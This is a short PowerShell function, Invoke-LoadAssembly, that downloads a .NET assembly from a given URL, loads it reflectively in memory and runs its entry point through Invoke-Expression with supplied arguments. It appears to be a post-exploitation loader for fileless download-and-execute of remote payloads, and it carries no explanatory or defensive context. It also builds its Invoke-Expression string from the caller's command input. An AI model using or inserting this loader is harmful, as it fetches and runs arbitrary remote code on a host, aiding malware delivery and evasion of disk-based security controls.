function Invoke-LoadAssembly
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $AssemblyUrl,
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $Command
        )

    $WebClient = New-Object System.Net.WebClient
    [Byte[]]$AssemblyBytes = $WebClient.DownloadData($AssemblyUrl)
    $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)

    $ep = $assembly.EntryPoint
    $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
    echo $ldrcommand
    Invoke-Expression $ldrcommand
}
